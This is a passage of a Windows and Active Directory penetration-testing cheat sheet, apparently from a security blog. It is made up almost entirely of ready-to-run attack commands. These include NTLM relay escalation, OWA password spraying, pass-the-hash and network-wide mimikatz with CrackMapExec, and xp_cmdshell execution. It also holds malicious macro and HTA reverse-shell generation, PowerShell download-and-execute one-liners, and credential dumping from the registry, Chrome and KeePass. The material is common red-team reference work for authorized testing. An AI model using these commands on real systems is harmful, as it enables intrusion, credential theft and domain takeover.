ntlmrelayx.py -t ldap:&#x2F;&#x2F;DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE

python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Exchange-Password-Spray"><a href="#Exchange-Password-Spray" class="headerlink" title="Exchange Password Spray"></a>Exchange Password Spray</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;dafthack&#x2F;MailSniper.git

Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019


#https:&#x2F;&#x2F;github.com&#x2F;sensepost&#x2F;ruler

.&#x2F;ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="ExchangeRelayX"><a href="#ExchangeRelayX" class="headerlink" title="ExchangeRelayX"></a>ExchangeRelayX</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;quickbreach&#x2F;ExchangeRelayX

An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.


.&#x2F;exchangeRelayx.py -t https:&#x2F;&#x2F;mail.quickbreach.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Exchange-Mailbox-Post-Compromise"><a href="#Exchange-Mailbox-Post-Compromise" class="headerlink" title="Exchange Mailbox Post-Compromise"></a>Exchange Mailbox Post-Compromise</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;dafthack&#x2F;MailSniper.git

Enumerate GlobalAddressList

Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019

Enumerate AD Usernames

Get-ADUsernameFromEWS -Emaillist .\users.txt

Enumerate Mailbox Folders

Get-MailboxFolders -Mailbox jamie@m0chanAD.local

Enumerate Passwords &amp; Credentials Stored in Emails

Invoke-SelfSearch -Mailbox jamie@m0chanAD.local

Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin

Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><pre class="line-numbers language-none"><code class="language-none">CrackMapExec is installed on Kali or get Windows Binary from Github.

Has 3 Execution Methods
crackmapexec smb &lt;- Creating and Running a Service over SMB
crackmapexec wmi &lt;- Executes command over WMI
crackmapexec at &lt;- Schedules Task with Task Scheduler

Can execute plain commands with -X flag i&#x2F;e 

crcakmapexec smb 10.10.14.0&#x2F;24 -x whoami

crcakmapexec smb 10.10.14.0&#x2F;24 &lt;- Host Discovery
crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; 
crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --pass-pol
crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --shares


Can also PTH with CME

crackmapexec smb 10.10.14.0&#x2F;24 -u user -H e8bcd502fbbdcd9379305dca15f4854e

cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares 


--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS

Dump Local SAM hashes

crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth --sam

Running Mimikatz 

crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth -M mimikatz

^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin

Enum AV Products

crackmapexec smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth -M enum_avproducts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Mail-Sniper"><a href="#Mail-Sniper" class="headerlink" title="Mail Sniper"></a>Mail Sniper</h4><pre class="line-numbers language-none"><code class="language-none">Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019

[*] Now spraying the OWA portal at https:&#x2F;&#x2F;m0chanAD.local&#x2F;owa&#x2F;

[*] SUCCESS! User:m0chan:Summer2019

Lmao, you really think Id use the pass Summer2019?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Kerberos-Stuff"><a href="#Kerberos-Stuff" class="headerlink" title="Kerberos Stuff"></a>Kerberos Stuff</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;gist.github.com&#x2F;TarlogicSecurity&#x2F;2f221924fef8c14a1d8e29f3cb5c5c4a
#https:&#x2F;&#x2F;m0chan.github.io&#x2F;Kerberos-Attacks-In-Depth<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="MSSQL-Exploiting-PowerUpSQL"><a href="#MSSQL-Exploiting-PowerUpSQL" class="headerlink" title="MSSQL Exploiting (PowerUpSQL)"></a>MSSQL Exploiting (PowerUpSQL)</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;NetSPI&#x2F;PowerUpSQL

#View SQL Instances
Get-SQLInstanceDomain [| Get-SQLServerInfo]

#Login in with Domain Account
Get-SQLConnectionTestThreaded

#Login in with Default Password
Get-SQLServerDefaultLoginPw

#List DB, Tables &amp; Columns

Get-SQLInstanceDomain | Get-SQLDatabase
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;

#Search Column Names for Word

Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10

#Try to Execute Commands (RCE)

Invoke-SQLOSCmd


#Enable XP_CMDShell Process

EXEC sp_configure &#39;show advanced options&#39;, 1;  
go  
RECONFIGURE;  
go  
EXEC sp_configure &#39;xp_cmdshell&#39;, 1;  
go  
RECONFIGURE;  
go  
xp_cmdshell &#39;&lt;cmd&gt;&#39;
go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Malicious-Macro-with-MSBuild"><a href="#Malicious-Macro-with-MSBuild" class="headerlink" title="Malicious Macro with MSBuild"></a>Malicious Macro with MSBuild</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;MaliciousMacroMSBuild

#https:&#x2F;&#x2F;lolbas-project.github.io&#x2F;lolbas&#x2F;Binaries&#x2F;Msbuild&#x2F; - MSBuild Explained

Creation of a Shellcode MSBuild VBA Macro
python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba

Creation of a PowerShell MSBuild VBA Macro
python m3-gen.py -p powershell -i &#x2F;path&#x2F;payload.ps1 -o output.vba

Creation of a Custom MSBuild VBA Macro
python m3-gen.py -p custom -i &#x2F;path&#x2F;msbuild.xml -o output.vba

Creation of a Shellcode MSBuild VBA Macro With Kill Date
python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba -k 20&#x2F;03&#x2F;2018

Creation of a Shellcode MSBuild VBA Macro With Environmental Keying
python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba -d yourdomain
python m3-gen.py -p shellcode -i &#x2F;path&#x2F;beacon.bin -o output.vba -d yourdomain, microsoft, github<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="WeirdHTA-Undetectable-HTA"><a href="#WeirdHTA-Undetectable-HTA" class="headerlink" title="WeirdHTA - Undetectable HTA"></a>WeirdHTA - Undetectable HTA</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;felamos&#x2F;weirdhta

python3 --help
python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)
python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)
python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)
python3 weirdhta.py 10.10.10.10 4444 --command &#39;c:\windows\system32\cmd.exe&#39; (custom command)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="EvilWinRM"><a href="#EvilWinRM" class="headerlink" title="EvilWinRM"></a>EvilWinRM</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;Hackplayers&#x2F;evil-winrm

Ultimate Shell for WinRM Connections

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]
    -S, --ssl                        Enable SSL
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname (required)
    -U, --url URL                    Remote url endpoint (default &#x2F;wsman)
    -u, --user USER                  Username (required)
    -p, --password PASS              Password
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -h, --help                       Display this help message<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="GetVulnerableGPO"><a href="#GetVulnerableGPO" class="headerlink" title="GetVulnerableGPO"></a>GetVulnerableGPO</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;gpoguy&#x2F;GetVulnerableGPO

PowerShell script to find &#39;vulnerable&#39; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https:&#x2F;&#x2F;sdmsoftware.com&#x2F;group-policy-blog&#x2F;security-related&#x2F;security-fun-bloodhound-ms16-072-gpo-discoverability&#x2F;) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https:&#x2F;&#x2F;s3.amazonaws.com&#x2F;sdmsoftware.com&#x2F;dl&#x2F;SDM-GPMC-Module2.0Setup.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="Invoke-PSImage"><a href="#Invoke-PSImage" class="headerlink" title="Invoke-PSImage"></a>Invoke-PSImage</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;peewpw&#x2F;Invoke-PSImage

Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute

Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.

PS&gt;Import-Module .\Invoke-PSImage.ps1
PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg
   [Oneliner to execute from a file]
   
   
PS&gt;Import-Module .\Invoke-PSImage.ps1
PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest
   [Oneliner to execute from the web]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Meterpreter-Donut-Shellcode-Injection-NET"><a href="#Meterpreter-Donut-Shellcode-Injection-NET" class="headerlink" title="Meterpreter + Donut - Shellcode Injection .NET"></a>Meterpreter + Donut - Shellcode Injection .NET</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;iwantmore.pizza&#x2F;posts&#x2F;meterpreter-shellcode-inject.html

A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!

donut -f &#x2F;tmp&#x2F;mimikatz.exe -a 2 -o &#x2F;tmp&#x2F;payload.bin

use post&#x2F;windows&#x2F;manage&#x2F;shellcode_inject
set SHELLCODE &#x2F;tmp&#x2F;payload.bin
set SESSION 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Reference: <a target="_blank" rel="noopener" href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></p>
<p>Run this script: <a target="_blank" rel="noopener" href="https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat">https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat</a></p>
<h4 id="Basics-1"><a href="#Basics-1" class="headerlink" title="Basics"></a>Basics</h4><pre class="line-numbers language-none"><code class="language-none">systeminfo
wmic qfe
net users
hostname
whoami
net localgroups
echo %logonserver%
netsh firewall show state
netsh firewall show config
netstat -an
type C:\Windows\system32\drivers\etc\hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="PowerUp-ps1-Sometimes-a-Quick-Win"><a href="#PowerUp-ps1-Sometimes-a-Quick-Win" class="headerlink" title="PowerUp.ps1 (Sometimes a Quick Win)"></a>PowerUp.ps1 (Sometimes a Quick Win)</h4><pre class="line-numbers language-none"><code class="language-none">powershell.exe &#x2F;c IEX(New-Object Net.WebClient).downloadString(&#39;webserver&#x2F;PowerUp.ps1&#39;) ;Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="SharpUp"><a href="#SharpUp" class="headerlink" title="SharpUp"></a>SharpUp</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;SharpUp

C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="If-It’s-AD-Get-Bloodhound-Imported…"><a href="#If-It’s-AD-Get-Bloodhound-Imported…" class="headerlink" title="If It’s AD Get Bloodhound Imported…"></a>If It’s AD Get Bloodhound Imported…</h4><pre class="line-numbers language-none"><code class="language-none">SharpHound.ps1
SharpHound.exe -&gt; https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;SharpHound

IEX(System.Net.WebClient.DownloadString(&#39;http:&#x2F;&#x2F;webserver:4444&#x2F;SharpHound.ps1&#39;))

Invoke-CollectionMethod All

Import .zip to Bloodhound

If you can&#39;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&#39;s a big big pain but it works.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Bloodhound-Python"><a href="#Bloodhound-Python" class="headerlink" title="Bloodhound-Python"></a>Bloodhound-Python</h4><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;fox-it&#x2F;BloodHound.py.git
cd BloodHound.py&#x2F; &amp;&amp; pip install .

bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Cleartext-Passwords"><a href="#Cleartext-Passwords" class="headerlink" title="Cleartext Passwords"></a>Cleartext Passwords</h4><pre class="line-numbers language-none"><code class="language-none"># Windows autologin
reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;

# VNC
reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;

# SNMP Parameters
reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;

# Putty
reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;

# Search for password in registry
reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s
reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="View-Installed-Software"><a href="#View-Installed-Software" class="headerlink" title="View Installed Software"></a>View Installed Software</h4><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

dir &#x2F;a &quot;C:\Program Files&quot;
dir &#x2F;a &quot;C:\Program Files (x86)&quot;
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem &#39;C:\Program Files&#39;, &#39;C:\Program Files (x86)&#39; | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Weak-Folder-Permissions"><a href="#Weak-Folder-Permissions" class="headerlink" title="Weak Folder Permissions"></a>Weak Folder Permissions</h4><pre class="line-numbers language-none"><code class="language-none">Full Permissions for &#39;Everyone&#39; on Program Folders

icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;
icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;

icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;
icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; 

Modify Permissions for Everyone on Program Folders

icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;
icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;

icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; 
icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h4><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Powershell-History"><a href="#Powershell-History" class="headerlink" title="Powershell History"></a>Powershell History</h4><pre class="line-numbers language-none"><code class="language-none">type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="View-Connected-Drives"><a href="#View-Connected-Drives" class="headerlink" title="View Connected Drives"></a>View Connected Drives</h4><pre class="line-numbers language-none"><code class="language-none">net use
wmic logicaldisk get caption,description

Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="View-Privs"><a href="#View-Privs" class="headerlink" title="View Privs"></a>View Privs</h4><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;priv

Look for SeImpersonate, SeDebugPrivilege etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="Is-Anyone-Else-Logged-In"><a href="#Is-Anyone-Else-Logged-In" class="headerlink" title="Is Anyone Else Logged In?"></a>Is Anyone Else Logged In?</h4><pre class="line-numbers language-none"><code class="language-none">qwinsta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="View-Registry-Auto-Login"><a href="#View-Registry-Auto-Login" class="headerlink" title="View Registry Auto-Login"></a>View Registry Auto-Login</h4><pre class="line-numbers language-none"><code class="language-none">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;

Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#39; | select &quot;Default*&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="View-Stored-Creds-in-Credential-Manager"><a href="#View-Stored-Creds-in-Credential-Manager" class="headerlink" title="View Stored Creds in Credential Manager"></a>View Stored Creds in Credential Manager</h4><pre class="line-numbers language-none"><code class="language-none">cmdkey &#x2F;list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="View-Unquoted-Service-Paths"><a href="#View-Unquoted-Service-Paths" class="headerlink" title="View Unquoted Service Paths"></a>View Unquoted Service Paths</h4><pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr &#x2F;i &quot;Auto&quot; 2&gt;nul |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; 2&gt;nul |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &#39;&quot;*&#39;&#125; | select PathName,DisplayName,Name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="View-Startup-Items"><a href="#View-Startup-Items" class="headerlink" title="View Startup Items"></a>View Startup Items</h4><pre class="line-numbers language-none"><code class="language-none">wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;
dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Check-for-AlwaysInstalledElevated-Reg-Key"><a href="#Check-for-AlwaysInstalledElevated-Reg-Key" class="headerlink" title="Check for AlwaysInstalledElevated Reg Key"></a>Check for AlwaysInstalledElevated Reg Key</h4><pre class="line-numbers language-none"><code class="language-none">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated
Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Any-Passwords-in-Registry"><a href="#Any-Passwords-in-Registry" class="headerlink" title="Any Passwords in Registry?"></a>Any Passwords in Registry?</h4><pre class="line-numbers language-none"><code class="language-none">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s
reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="Any-Sysrep-or-Unattend-Files-Left-Over"><a href="#Any-Sysrep-or-Unattend-Files-Left-Over" class="headerlink" title="Any Sysrep or Unattend Files Left Over"></a>Any Sysrep or Unattend Files Left Over</h4><pre class="line-numbers language-none"><code class="language-none">dir &#x2F;s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul

Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="GPP-Group-Policy-Preferences-Passwords"><a href="#GPP-Group-Policy-Preferences-Passwords" class="headerlink" title="GPP (Group Policy Preferences) Passwords"></a>GPP (Group Policy Preferences) Passwords</h4><pre class="line-numbers language-none"><code class="language-none">smbclient &#x2F;&#x2F;DOMAINCONTROLLER.local&#x2F;SYSVOL -U m0chan

\m0chanAD.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\

http:&#x2F;&#x2F;www.sec-1.com&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;05&#x2F;gp3finder_v4.0.zip - For Decryption

Can also use PowerUP.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-Chrome-Passwords-Also-Post-Exploit"><a href="#Dump-Chrome-Passwords-Also-Post-Exploit" class="headerlink" title="Dump Chrome Passwords (Also Post Exploit)"></a>Dump Chrome Passwords (Also Post Exploit)</h4><pre class="line-numbers language-none"><code class="language-none">#git clone https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;CookieMonster

CookieMonster creds
CookieMonster.exe cookies -d [domain] -e 
CookieMonster -a 

Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.

Can also use Mimikatz for this.

mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;

mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; &#x2F;unprotect

mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Dump-KeePass"><a href="#Dump-KeePass" class="headerlink" title="Dump KeePass"></a>Dump KeePass</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;HarmJ0y&#x2F;KeeThief
#http:&#x2F;&#x2F;www.harmj0y.net&#x2F;blog&#x2F;redteaming&#x2F;keethief-a-case-study-in-attacking-keepass-part-2&#x2F;

Get-Process keepass
tasklist | findstr keepass

Attacking KeePass

#https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;HarmJ0y&#x2F;KeeThief&#x2F;master&#x2F;PowerShell&#x2F;KeeThief.ps1
Import-Module KeeThief.ps1
Get-KeePassDatabaseKey -Verbose

KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Token-Impersonation"><a href="#Token-Impersonation" class="headerlink" title="Token Impersonation"></a>Token Impersonation</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;c7985c9bc31e92bb6243c177d7d1d7e68b6f1816&#x2F;Exfiltration&#x2F;Invoke-TokenManipulation.ps1

